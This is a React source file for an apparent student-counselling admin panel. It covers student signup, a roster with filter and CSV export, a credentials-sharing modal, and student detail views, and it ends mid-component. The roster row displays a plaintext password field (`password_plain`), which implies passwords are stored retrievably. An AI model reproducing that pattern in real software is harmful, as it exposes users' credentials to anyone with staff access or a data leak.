import { useCallback, useEffect, useMemo, useState } from "react";
import { Loader2, UserPlus, Copy, Check, ChevronDown, ChevronRight, AlertCircle, KeyRound, X, MessageCircle, Mail, Link2, Search, Download, RefreshCw, Eye, Send, Clock, ArrowLeft, ArrowRight } from "lucide-react";
import { api } from "./api.js";
import { progressFor, TONE_CLASSES } from "./intakeProgress.js";
import ResumeMarkdown from "./ResumeMarkdown.jsx";
import ResumeTemplate from "./ResumeTemplate.jsx";
import useAutoRefresh from "./useAutoRefresh.js";
import RequestManualFillBanner from "./RequestManualFillBanner.jsx";
import StudentDashboard, {
  extractAnswers,
  groupAnswersBySchema,
  ChapterSummaryBlock,
  DocumentPreview,
  ExtractionStep,
  buildFieldIndex,
  filesForPage,
} from "./StudentDashboard.jsx";

// Students tab — visible to admin (full roster) and counsellor (own only).
// Two purposes:
//   1. Sign new students up: type username + optional lead link, get back a
//      one-time generated password the counsellor copies and sends.
//   2. Browse the roster + drill into each student's intake data, uploaded
//      files, and generated resume.
export default function StudentsAdmin({ role, counsellors = [], autoExpandStudentId = null, onAutoExpandConsumed }) {
  const [students, setStudents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  // Clicking a row opens the full-screen modal; we no longer expand
  // detail in-place. State is the student_id of the row whose modal
  // is open, or null when nothing is open.
  const [modalStudentId, setModalStudentId] = useState(null);

  // Cross-tab handoff: the IELTS panel passes a student_id when its
  // "View" button is clicked. Open the modal for that student; the
  // scroll-into-view used to be needed when this expanded inline,
  // but the modal sits over the page so the row position doesn't
  // matter anymore.
  useEffect(() => {
    if (!autoExpandStudentId) return;
    setModalStudentId(autoExpandStudentId);
    onAutoExpandConsumed?.();
  }, [autoExpandStudentId, onAutoExpandConsumed]);
  // Roster filter — case-insensitive substring match across the visible
  // metadata columns. Cheap client-side filter; server pagination is a
  // future concern (we only return the row count up to a few hundred).
  const [filter, setFilter] = useState("");
  const [credentialsModal, setCredentialsModal] = useState(null);
  // "View as student" overlay — preloaded { student, files, resumes }
  // shape from the staff detail endpoint. Lets admin/counsellor see
  // exactly what the student sees on their own dashboard.
  const [viewAsStudent, setViewAsStudent] = useState(null);

  const refresh = useCallback(async () => {
    try {
      const list = await api.listStudents();
      setStudents(list);
      setError(null);
    } catch (e) {
      setError(e.message);
    }
  }, []);

  useEffect(() => {
    let active = true;
    refresh().finally(() => {
      if (active) setLoading(false);
    });
    return () => {
      active = false;
    };
  }, [refresh]);

  useAutoRefresh(refresh);

  const onCreated = (account) => {
    setCredentialsModal(account);
    refresh();
  };

  // Substring filter against the same fields that show on the row card.
  const filteredStudents = useMemo(() => {
    const q = filter.trim().toLowerCase();
    if (!q) return students;
    return students.filter((s) => {
      const haystack = [
        s.username,
        s.display_name,
        s.lead_name,
        s.counsellor_name,
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase();
      return haystack.includes(q);
    });
  }, [students, filter]);

  return (
    <div>
      <CreateStudentForm role={role} counsellors={counsellors} onCreated={onCreated} />

      <div className="mt-8 mb-3 flex flex-wrap items-baseline justify-between gap-3 border-b border-stone-300 pb-2">
        <h2 className="text-sm font-semibold uppercase tracking-[0.2em] text-black">
          Students {students.length > 0 && (
            <span className="ml-2 text-xs font-normal text-black">
              ({filteredStudents.length}
              {filteredStudents.length !== students.length ? ` of ${students.length}` : ""})
            </span>
          )}
        </h2>
        <div className="flex items-center gap-2">
          {loading && <Loader2 className="h-4 w-4 animate-spin text-black" />}
          <div className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1">
            <Search className="h-3 w-3 text-black" />
            <input
              type="search"
              value={filter}
              onChange={(e) => setFilter(e.target.value)}
              placeholder="filter…"
              className="w-40 bg-transparent text-xs outline-none"
            />
          </div>
          <button
            onClick={() => downloadStudentsCsv(filteredStudents)}
            disabled={filteredStudents.length === 0}
            title="Download visible rows as CSV"
            className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700 disabled:opacity-30"
          >
            <Download className="h-3 w-3" /> CSV
          </button>
        </div>
      </div>

      {error && (
        <p className="mb-3 inline-flex items-center gap-2 text-xs text-red-700">
          <AlertCircle className="h-3 w-3" /> {error}
        </p>
      )}

      {students.length === 0 && !loading && !error && (
        <p className="mt-6 text-sm  text-black">
          No students yet. Sign someone up using the form above.
        </p>
      )}
      {students.length > 0 && filteredStudents.length === 0 && (
        <p className="mt-6 text-sm  text-black">
          No students match "{filter}".
        </p>
      )}

      <div className="space-y-2">
        {filteredStudents.map((s) => (
          <StudentRow
            key={s.student_id}
            row={s}
            role={role}
            onOpen={() => setModalStudentId(s.student_id)}
            onResetPassword={(account) => setCredentialsModal(account)}
            onViewAs={(detail) => setViewAsStudent(detail)}
          />
        ))}
      </div>

      {credentialsModal && (
        <CredentialsModal
          account={credentialsModal}
          onClose={() => setCredentialsModal(null)}
        />
      )}

      {viewAsStudent && (
        <ViewAsStudentModal
          detail={viewAsStudent}
          onClose={() => setViewAsStudent(null)}
        />
      )}

      {modalStudentId && (
        <StudentDetailModal
          studentId={modalStudentId}
          role={role}
          onClose={() => setModalStudentId(null)}
        />
      )}
    </div>
  );
}

// ============================================================
// ViewAsStudentModal — full-screen overlay that renders the
// post-intake StudentDashboard against a pre-loaded staff payload.
// Lets admin/counsellor see the student's own view without logging
// in as them.
// ============================================================
function ViewAsStudentModal({ detail, onClose }) {
  // Lock body scroll while the overlay is open so the underlying
  // admin panel doesn't scroll behind the dashboard view.
  useEffect(() => {
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, []);

  return (
    <div
      className="fixed inset-0 z-50 overflow-y-auto bg-stone-900/40"
      onClick={onClose}
    >
      <div
        className="mx-auto my-6 max-w-5xl border border-stone-300 bg-[#f4f0e6] shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="sticky top-0 z-10 flex items-center justify-between gap-3 border-b border-stone-300 bg-[#f4f0e6]/95 px-5 py-3 backdrop-blur">
          <p className="text-[11px] font-semibold uppercase tracking-[0.2em] text-black">
            <Eye className="mr-2 inline-block h-3 w-3" />
            Viewing as {detail.student?.display_name || detail.student?.username}
          </p>
          <button
            onClick={onClose}
            className="inline-flex items-center gap-1 border border-stone-400 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black hover:border-stone-700"
          >
            <X className="h-3 w-3" /> Close
          </button>
        </div>
        <StudentDashboard staffPreview={detail} />
      </div>
    </div>
  );
}

// ============================================================
// CreateStudentForm — the counsellor / admin signup form.
// Admin sees an "Assign to counsellor" dropdown (required); counsellor
// session self-assigns server-side (they create students for themselves
// only — letting them pick another counsellor would shift ownership).
// ============================================================
function CreateStudentForm({ role, counsellors, onCreated }) {
  const [username, setUsername] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [counsellorId, setCounsellorId] = useState("");
  const [starterFiles, setStarterFiles] = useState([]);
  const [submitting, setSubmitting] = useState(false);
  const [err, setErr] = useState(null);

  const counsellorOptions = useMemo(
    () => (Array.isArray(counsellors) ? counsellors : []),
    [counsellors]
  );

  const isAdmin = role === "admin";
  const requiresCounsellor = isAdmin;
  const canSubmit =
    !submitting && username.trim() && (!requiresCounsellor || counsellorId);

  const submit = async (e) => {
    e.preventDefault();
    setErr(null);
    setSubmitting(true);
    try {
      const payload = {
        username: username.trim(),
        display_name: displayName.trim() || null,
        counsellor_id: isAdmin ? counsellorId || null : null,
      };
      // When the counsellor has dropped starter documents in, route
      // through the bulk-upload endpoint so the row lands with the
      // ai_eligible_via_pre_upload flag set and the AI pipeline picks
      // it up on the next hourly tick. Empty file list falls through to
      // the lightweight create-only path so signups without documents
      // keep their existing single-shot behaviour.
      const account = starterFiles.length > 0
        ? await api.createStudentWithDocs(payload, starterFiles)
        : await api.createStudent(payload);
      onCreated(account);
      setUsername("");
      setDisplayName("");
      setCounsellorId("");
      setStarterFiles([]);
    } catch (e) {
      setErr(e.message);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <form
      onSubmit={submit}
      className="rounded-none border border-stone-300 bg-white p-5"
    >
      <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.2em] text-black">
        Sign up a new student
      </p>
      <RequestManualFillBanner className="mb-4" />
      <div className={`grid grid-cols-1 gap-4 ${isAdmin ? "md:grid-cols-3" : "md:grid-cols-2"}`}>
        {isAdmin && (
          <label className="block">
            <span className="text-[10px] uppercase tracking-[0.15em] text-black">
              Assign to counsellor *
            </span>
            <select
              value={counsellorId}
              onChange={(e) => setCounsellorId(e.target.value)}
              required
              className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
            >
              <option value="">— select counsellor —</option>
              {counsellorOptions.map((c) => (
                <option key={c.id} value={c.id}>
                  {c.name}
                </option>
              ))}
            </select>
          </label>
        )}
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-black">
            Username *
          </span>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="e.g. riya_sharma"
            required
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-black">
            Display name (optional)
          </span>
          <input
            type="text"
            value={displayName}
            onChange={(e) => setDisplayName(e.target.value)}
            placeholder="Riya Sharma"
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
      </div>
      <StarterDocsField files={starterFiles} onChange={setStarterFiles} />
      <div className="mt-4 flex flex-col gap-2">
        <div className="flex flex-wrap items-center gap-3">
          <button
            type="submit"
            disabled={!canSubmit}
            className="inline-flex items-center gap-2 border border-[#cc785c] bg-[#cc785c] px-4 py-2 text-xs uppercase tracking-[0.2em] text-white transition hover:bg-[#b86a4f] disabled:opacity-50"
          >
            {submitting ? <Loader2 className="h-3 w-3 animate-spin" /> : <UserPlus className="h-3 w-3" />}
            {submitting
              ? (starterFiles.length > 0 ? "Uploading…" : "Creating…")
              : (starterFiles.length > 0 ? "Create account & queue for processing" : "Create account")}
          </button>
          {err && (
            <span className="inline-flex items-center gap-1 text-xs text-red-700">
              <AlertCircle className="h-3 w-3" /> {err}
            </span>
          )}
        </div>
        {starterFiles.length > 0 && (
          <p className="text-sm text-stone-800">
            On submit, the dev is notified and runs the automation script
            from Claude Code. The student's intake form, resume, SOP, and
            LOR drafts land once that run completes.
          </p>
        )}
      </div>
    </form>
  );
}

// Optional multi-file picker on the create-student form. When the
// counsellor has documents on hand at signup time (marksheets, passport,
// IELTS slip, etc.), dropping them here routes the form through
// /api/students/with-docs instead of the plain create endpoint. The
// uploads are attached to the new student row in one transaction and
// land in the AI pending queue. The dev runs the automation script
// from Claude Code on notification — the student's intake form lands
// pre-filled by the time they log in.
function StarterDocsField({ files, onChange }) {
  const onPick = (e) => {
    const picked = Array.from(e.target.files || []);
    if (picked.length === 0) return;
    // Append to whatever's already selected — multi-stage picking is
    // common on mobile (camera roll, then a fresh document scan).
    // Reset the input so re-selecting the same file fires the change.
    onChange([...files, ...picked]);
    e.target.value = "";
  };
  const removeAt = (idx) => {
    onChange(files.filter((_, i) => i !== idx));
  };
  const totalBytes = files.reduce((sum, f) => sum + (f.size || 0), 0);
  return (
    <div className="mt-5 border-t border-stone-200 pt-4">
      <p className="text-[10px] uppercase tracking-[0.15em] text-black">
        Starter documents (optional)
      </p>
      <p className="mt-1 text-sm text-stone-800">
        Drop in marksheets, passport, test slips, certificates — anything you already have.
        On submit, the dev is notified and runs the automation script from Claude Code,
        which auto-fills the intake form and drafts the resume, SOP, and LOR letters.
      </p>
      {files.length > 0 && (
        <ul className="mt-3 space-y-1.5">
          {files.map((f, idx) => (
            <li key={`${f.name}-${idx}`} className="flex items-center justify-between gap-3 border border-stone-200 bg-stone-50 px-2.5 py-1.5 text-xs text-black">
              <span className="truncate">{f.name} <span className="text-stone-700">({Math.round((f.size || 0) / 1024)} KB)</span></span>
              <button
                type="button"
                onClick={() => removeAt(idx)}
                className="text-[10px] uppercase tracking-[0.15em] text-stone-700 hover:text-red-700"
              >
                Remove
              </button>
            </li>
          ))}
          <li className="text-[11px] text-stone-700">
            {files.length} file{files.length === 1 ? "" : "s"} · {Math.round(totalBytes / 1024)} KB total
          </li>
        </ul>
      )}
      <label className="mt-3 inline-flex cursor-pointer items-center gap-1 border border-stone-300 bg-white px-3 py-1.5 text-[11px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700">
        <input
          type="file"
          multiple
          accept="application/pdf,image/jpeg,image/png,image/webp"
          onChange={onPick}
          className="hidden"
        />
        {files.length === 0 ? "Add documents" : "Add more"}
      </label>
    </div>
  );
}

// ============================================================
// CredentialsModal — shown after account creation or password reset.
// Three send paths so the counsellor's "send to the student" flow is
// one click instead of manual copy-paste:
//   - Open WhatsApp with the message prefilled
//   - Open the email client with subject + body prefilled
//   - Copy a plain-text version of the same message
// The message includes the login URL with ?u=username so the student's
// login form opens prefilled, plus a short list of documents to have
// ready before they start. The password is shown ONCE — clicking the
// modal away loses it forever (recovery is via Reset pw).
// ============================================================

// Required-doc checklist surfaced in the onboarding message. Mirrors
// the most common intake fields in a friendlier order. Kept here (not
// dynamically derived from the schema) so the message stays short and
// stable; if the schema grows this list should be revisited.
const REQUIRED_DOCS_FOR_MESSAGE = [
  "Class 10, 11, 12 marksheets (PDF or phone photos work)",
  "Passport (front, back, last page)",
  "Test scores: IELTS / TOEFL / SAT / AP — whichever you have",
  "2-3 letters of recommendation (LORs)",
  "Statement of purpose draft",
  "Activity / award certificates",
];

function buildOnboardingMessage(account) {
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  return [
    `Hi ${account.display_name || "there"},`,
    ``,
    `Your Persona account is ready. We'll use it to collect your profile + documents and generate tailored resumes for your university applications.`,
    ``,
    `🔗 Log in: ${loginUrl}`,
    `👤 Username: ${account.username}`,
    `🔑 Password: ${account.password}`,
    ``,
    `You'll need these ready (PDF or phone photo both work — your progress saves automatically, no rush):`,
    ...REQUIRED_DOCS_FOR_MESSAGE.map((d) => `  • ${d}`),
    ``,
    `Any questions, message back here.`,
  ].join("\n");
}

function CredentialsModal({ account, onClose }) {
  const [copied, setCopied] = useState(null);

  const message = buildOnboardingMessage(account);
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  const whatsappHref = `https://wa.me/?text=${encodeURIComponent(message)}`;
  const mailtoHref =
    `mailto:?subject=${encodeURIComponent("Your Persona account is ready")}` +
    `&body=${encodeURIComponent(message)}`;

  const copy = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(label);
      setTimeout(() => setCopied(null), 1500);
    } catch {
      setCopied("error");
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-stone-900/40 p-4"
      onClick={onClose}
    >
      <div
        className="max-h-[90vh] w-full max-w-lg overflow-y-auto border border-stone-300 bg-white p-6 shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="mb-4 flex items-baseline justify-between">
          <p className="text-[11px] font-semibold uppercase tracking-[0.2em] text-black">
            <KeyRound className="mr-2 inline-block h-3 w-3" />
            Account ready — send to student
          </p>
          <button
            onClick={onClose}
            className="text-black hover:text-black"
            aria-label="Close"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        <p className="mb-4 text-xs text-amber-800">
          ⚠ The password is shown <strong>once</strong>. Send it now — if you close
          this modal you'll need to use <strong>Reset pw</strong> to generate a new one.
        </p>

        <CredField label="Username" value={account.username} onCopy={() => copy(account.username, "username")} copied={copied === "username"} />
        <CredField label="Password" value={account.password} onCopy={() => copy(account.password, "password")} copied={copied === "password"} mono />
        <CredField label="Login link" value={loginUrl} onCopy={() => copy(loginUrl, "url")} copied={copied === "url"} />

        {/* If the student has a student_id (always true on fresh
            creation; absent on password-reset flows where account is
            re-fetched without it), surface the AI-fill request banner
            so the counsellor can queue it before they close. */}
        {account.student_id && (
          <div className="mt-4 border-t border-stone-200 pt-4">
            <RequestManualFillBanner
              studentId={account.student_id}
              studentDisplayName={account.display_name || account.username}
            />
          </div>
        )}

        {/* Three send paths — each opens the user's preferred channel
            with a fully-formed message prefilled (login link + creds +
            required-docs checklist). Counsellor edits before sending if
            they want to. Auto-fills the student's own messenger; we
            don't talk to WhatsApp / email APIs from the server. */}
        <div className="mt-5 border-t border-stone-200 pt-4">
          <p className="mb-2 text-[10px] font-semibold uppercase tracking-[0.15em] text-black">
            Send to student
          </p>
          <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
            <a
              href={whatsappHref}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center justify-center gap-2 border border-emerald-700 bg-emerald-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-emerald-800"
            >
              <MessageCircle className="h-3 w-3" /> WhatsApp
            </a>
            <a
              href={mailtoHref}
              className="inline-flex items-center justify-center gap-2 border border-stone-700 bg-stone-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-stone-800"
            >
              <Mail className="h-3 w-3" /> Email
            </a>
            <button
              onClick={() => copy(message, "message")}
              className="inline-flex items-center justify-center gap-2 border border-stone-300 bg-white px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
            >
              {copied === "message" ? <Check className="h-3 w-3 text-emerald-700" /> : <Link2 className="h-3 w-3" />}
              {copied === "message" ? "Copied" : "Copy text"}
            </button>
          </div>
          <details className="mt-3">
            <summary className="cursor-pointer text-[10px] uppercase tracking-[0.15em] text-black hover:text-black">
              Preview message
            </summary>
            <pre className="mt-2 max-h-48 overflow-auto whitespace-pre-wrap border border-stone-200 bg-stone-50 p-2 text-[11px] text-black">
              {message}
            </pre>
          </details>
        </div>

        <button
          onClick={onClose}
          className="mt-6 w-full border border-stone-400 px-4 py-2 text-xs uppercase tracking-[0.2em] text-black hover:bg-stone-50"
        >
          I've sent them
        </button>
      </div>
    </div>
  );
}

function CredField({ label, value, onCopy, copied, mono }) {
  return (
    <div className="mb-3">
      <p className="text-[10px] uppercase tracking-[0.15em] text-black">{label}</p>
      <div className="mt-1 flex items-center justify-between gap-2 border border-stone-300 bg-stone-50 px-3 py-2">
        <span className={`select-all truncate text-sm text-black ${mono ? "font-mono" : ""}`}>
          {value}
        </span>
        <button
          onClick={onCopy}
          className="inline-flex shrink-0 items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
        >
          {copied ? <Check className="h-3 w-3 text-emerald-700" /> : <Copy className="h-3 w-3" />}
          {copied ? "copied" : "copy"}
        </button>
      </div>
    </div>
  );
}

// Progress text per row — phase + specific step counts. Computed
// client-side from the `data` jsonb so the manifest stays a single
// source of truth in StudentIntake.jsx.
function ProgressLabel({ row }) {
  const { label, tone } = progressFor(row);
  return <span className={TONE_CLASSES[tone] || ""}>{label}</span>;
}

// ============================================================
// StudentRow — collapsed roster row + expandable detail view.
// ============================================================
function StudentRow({ row, role, onOpen, onResetPassword, onViewAs }) {
  const [viewAsBusy, setViewAsBusy] = useState(false);

  const resetPassword = async (e) => {
    e.stopPropagation();
    if (!confirm(`Reset password for "${row.username}"? The new password will be shown once.`)) return;
    try {
      const account = await api.resetStudentPassword(row.student_id);
      onResetPassword(account);
    } catch (e) {
      alert(`Reset failed: ${e.message}`);
    }
  };

  const openViewAs = async (e) => {
    e.stopPropagation();
    if (viewAsBusy) return;
    setViewAsBusy(true);
    try {
      const d = await api.getStudent(row.student_id);
      onViewAs(d);
    } catch (err) {
      alert(`Couldn't open student view: ${err?.message || "unknown error"}`);
    } finally {
      setViewAsBusy(false);
    }
  };

  return (
    <div data-student-row={row.student_id} className="border border-stone-300 bg-white">
      <button
        onClick={onOpen}
        className="flex w-full items-center gap-3 px-4 py-3 text-left hover:bg-stone-50"
      >
        <div className="min-w-0 flex-1">
          <p className="truncate font-semibold text-black">
            {row.display_name || row.username}
            {row.display_name && (
              <span className="ml-2 text-xs font-normal text-black">@{row.username}</span>
            )}
          </p>
          <p className="mt-0.5 text-xs text-black">
            <ProgressLabel row={row} />
            {" · "}
            {row.file_count} files{" · "}
            {row.resume_count} resumes
            {" · "}
            <span className="text-black">{activityLabel(row)}</span>
            {row.lead_name && <> {" · "} from lead: <span className="text-black">{row.lead_name}</span></>}
            {row.counsellor_name && <> {" · "} by: {row.counsellor_name}</>}
          </p>
          {row.password_plain && (
            <p className="mt-1 text-[11px] text-black">
              pw:{" "}
              <span
                className="select-all font-mono text-black"
                onClick={(e) => e.stopPropagation()}
              >
                {row.password_plain}
              </span>
            </p>
          )}
        </div>
        <span className="ml-3 hidden shrink-0 items-center gap-1 sm:inline-flex">
          <button
            onClick={openViewAs}
            disabled={viewAsBusy}
            title="Open this student's panel — the same page they see after intake"
            className="inline-flex items-center gap-1 border border-stone-300 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black hover:border-stone-700 hover:text-black disabled:opacity-50"
          >
            {viewAsBusy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Eye className="h-3 w-3" />}
            View as
          </button>
          <button
            onClick={resetPassword}
            className="border border-stone-300 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black hover:border-stone-700 hover:text-black"
          >
            Reset pw
          </button>
        </span>
      </button>
    </div>
  );
}

// ============================================================
// StudentDetailModal — full-window overlay rendered when a roster
// row is clicked. Loads the staff detail payload, then renders the
// existing paginated StudentDetail (intake pages → AI resumes →
// required docs → uploaded files) inside the modal. The modal owns
// the body-scroll lock + Esc-to-close + click-outside-to-close
// affordances; section pagination stays inside StudentDetail's
// own sticky header where it already lives.
// ============================================================
function StudentDetailModal({ studentId, role, onClose }) {
  const [detail, setDetail] = useState(null);
  const [loading, setLoading] = useState(true);

  const refreshDetail = useCallback(async () => {
    try {
      const d = await api.getStudent(studentId);
      setDetail(d);
    } catch (e) {
      setDetail({ error: e.message });
    }
  }, [studentId]);

  useEffect(() => {
    let cancelled = false;
    setLoading(true);
    api.getStudent(studentId)
      .then((d) => { if (!cancelled) setDetail(d); })
      .catch((e) => { if (!cancelled) setDetail({ error: e.message }); })
      .finally(() => { if (!cancelled) setLoading(false); });
    return () => { cancelled = true; };
  }, [studentId]);

  // Auto-poll while any resume is mid-generation, same behaviour as
  // the old inline-expanded flow had.
  useEffect(() => {
    if (!detail || detail.error) return;
    const inflight = (detail.resumes || []).some(
      (r) => r.status === "pending" || r.status === "running"
    );
    if (!inflight) return;
    const t = setInterval(refreshDetail, 4000);
    return () => clearInterval(t);
  }, [detail, refreshDetail]);

  // Esc closes; lock body scroll while open.
  useEffect(() => {
    const onKey = (e) => { if (e.key === "Escape") onClose(); };
    document.addEventListener("keydown", onKey);
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.removeEventListener("keydown", onKey);
      document.body.style.overflow = prev;
    };
  }, [onClose]);

  const headerName =
    detail?.student?.display_name || detail?.student?.username || "Loading…";

  return (
    <div
      className="fixed inset-0 z-50 flex items-stretch justify-center overflow-y-auto bg-black/70 backdrop-blur-sm"
      onClick={onClose}
    >
      <div
        className="m-0 flex min-h-screen w-full max-w-6xl flex-col border-x border-stone-300 bg-[#f4f0e6] shadow-2xl sm:my-4 sm:min-h-[calc(100vh-2rem)]"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="sticky top-0 z-20 flex items-center justify-between gap-3 border-b border-stone-300 bg-[#f4f0e6]/95 px-5 py-4 backdrop-blur">
          <div className="min-w-0">
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-700">
              Student detail
            </p>
            <p className="truncate font-serif text-2xl text-black">{headerName}</p>
          </div>
          <button
            onClick={onClose}
            title="Close (Esc)"
            className="inline-flex shrink-0 items-center gap-1 border border-stone-400 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-black transition hover:border-stone-700 hover:bg-stone-50"
          >
            <X className="h-4 w-4" /> Close
          </button>
        </div>

        <div className="flex-1 overflow-y-auto px-4 py-4 sm:px-6 sm:py-6">
          {loading && (
            <p className="text-xs text-black">Loading…</p>
          )}
          {detail?.error && (
            <p className="text-xs text-red-700">{detail.error}</p>
          )}
          {detail && !detail.error && (
            <StudentDetail detail={detail} role={role} onRefresh={refreshDetail} />
          )}
        </div>
      </div>
    </div>
  );
}

// ============================================================
// StudentDetail — paginated read-only view of one student's data.
//
// Mirrors the student intake's prev/next flow so the admin can step
// horizontally through the same chapters/pages the student filled
// in, then through resumes / required-docs / uploaded files. One
// step on screen at a time keeps the row's expanded height roughly
// bounded to a laptop viewport instead of the prior wall of scroll.
// ============================================================
function StudentDetail({ detail, role, onRefresh }) {
  const { student, files, resumes } = detail;
  const [regen, setRegen] = useState({}); // { [resumeId]: { busy, err } }
  const handleRegen = useCallback(async (resumeId) => {
    if (!confirm("Regenerate this resume against the student's current data? Takes 30–60 seconds.")) return;
    setRegen((p) => ({ ...p, [resumeId]: { busy: true, err: null } }));
    try {
      await api.staffRegenerateResume(student.student_id, resumeId);
      // Refresh once now; the polling effect on the parent picks up
      // the now-pending status and continues to refresh until terminal.
      if (onRefresh) await onRefresh();
      setRegen((p) => ({ ...p, [resumeId]: { busy: false, err: null } }));
    } catch (e) {
      setRegen((p) => ({ ...p, [resumeId]: { busy: false, err: e?.message || "Regenerate failed." } }));
    }
  }, [student.student_id, onRefresh]);

  // Flat step sequence. Each chapter page becomes its own step (only
  // pages that have at least one answered field — `groupAnswersBySchema`
  // already filters those). Then the three always-on admin sections.
  const grouped = useMemo(() => {
    const answers = extractAnswers(student?.data);
    return groupAnswersBySchema(answers);
  }, [student?.data]);

  const fieldIndex = useMemo(() => buildFieldIndex(), []);

  // Field-id set the AI autofill pass populated. Persisted on
  // dispatch (server/routes/admin-ai.js) into student.data.autofilled_keys.
  // Used by ChapterSummaryBlock to badge each AI-written field with
  // an "AI autofilled" eyebrow.
  const autofilledKeys = useMemo(() => {
    const list = student?.data?.autofilled_keys;
    return Array.isArray(list) ? new Set(list) : null;
  }, [student?.data?.autofilled_keys]);

  // Each step is one focused slide. The flow is:
  //   1. For each chapter's pages, in order:
  //      a. Pages with NO uploaded files → a single "page" slide
  //         showing the form fields (typed answers).
  //      b. Pages with exactly one uploaded file → ONE combined slide
  //         showing the form fields, the document, and the AI analysis
  //         together (the typed context sits next to the scan).
  //      c. Pages with multiple uploaded files → a "page" review slide
  //         showing the form fields once, then ONE "doc-only" slide per
  //         file (PDF + AI analysis only). Avoids re-rendering the whole
  //         activities list for every proof PDF.
  //   2. Resumes step.
  //   3. Required documents step.
  const steps = useMemo(() => {
    const out = [];
    const allFiles = files || [];
    grouped.forEach((chapter) => {
      chapter.pages.forEach((page) => {
        const pageFiles = filesForPage(page, allFiles);
        if (pageFiles.length === 0) {
          out.push({
            kind: "page",
            chapterTitle: chapter.title,
            page,
            eyebrow: chapter.title,
            title: page.title,
          });
          return;
        }
        if (pageFiles.length === 1) {
          out.push({
            kind: "page-with-doc",
            chapterTitle: chapter.title,
            page,
            file: pageFiles[0],
            eyebrow: chapter.title,
            title: page.title,
          });
          return;
        }
        // Multi-doc page: review first, then one slide per document.
        out.push({
          kind: "page",
          chapterTitle: chapter.title,
          page,
          eyebrow: chapter.title,
          title: `${page.title} · review`,
        });
        pageFiles.forEach((file, i) => {
          out.push({
            kind: "doc-only",
            chapterTitle: chapter.title,
            page,
            file,
            eyebrow: chapter.title,
            title: `${page.title} · document ${i + 1}/${pageFiles.length}`,
          });
        });
      });
    });
    if (grouped.length === 0) {
      out.push({ kind: "empty", eyebrow: "Intake", title: "Form data" });
    }
    out.push({ kind: "resumes", eyebrow: "AI-generated resumes", title: `${resumes?.length || 0} on file` });
    out.push({ kind: "ai-suggestions", eyebrow: "AI suggestions", title: "Suggested LORs & SOP" });
    out.push({ kind: "required", eyebrow: "Required documents", title: "LOR / Internship / SOP" });
    return out;
  }, [grouped, resumes?.length, files]);

  const [stepIdx, setStepIdx] = useState(0);
  // Clamp if step list shrinks (e.g. resume row deleted).
  useEffect(() => {
    if (stepIdx > steps.length - 1) setStepIdx(Math.max(0, steps.length - 1));
  }, [steps.length, stepIdx]);

  const step = steps[stepIdx] || steps[0];
  const goPrev = () => setStepIdx((i) => Math.max(0, i - 1));
  const goNext = () => setStepIdx((i) => Math.min(steps.length - 1, i + 1));
  const atStart = stepIdx === 0;
  const atEnd = stepIdx === steps.length - 1;

  const phaseLabel = ({
    intake: "Filling intake form",
    generating: "Generating resume",
    done: "Intake complete",
  }[student?.intake_phase] || "Filling intake form");
  const phaseTone =
    student?.intake_phase === "done" ? "text-emerald-700"
    : student?.intake_phase === "generating" ? "text-amber-700"
    : "text-black";

  return (
    <div className="text-xs">
      {/* Sticky pagination bar — full-width progress strip on top so
          the reader sees position at a glance, then a prominent
          phase label on the left and big coloured prev/next buttons
          on the right. The orange (#cc785c) is the same brand accent
          used elsewhere in the app. */}
      <div className="sticky top-0 z-10 -mx-4 -mt-4 mb-6 border-b-2 border-stone-300 bg-white shadow-sm">
        <div className="h-1.5 w-full bg-stone-200">
          <div
            className="h-full bg-[#cc785c] transition-all duration-200"
            style={{ width: `${steps.length > 0 ? ((stepIdx + 1) / steps.length) * 100 : 0}%` }}
          />
        </div>
        <div className="flex flex-wrap items-center justify-between gap-3 px-5 py-4">
          <div className="flex items-baseline gap-3">
            <span className={`font-serif text-lg ${phaseTone}`}>{phaseLabel}</span>
            <span className="text-base text-stone-800">
              Step <span className="font-semibold text-black">{stepIdx + 1}</span> of <span className="font-semibold text-black">{steps.length}</span>
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
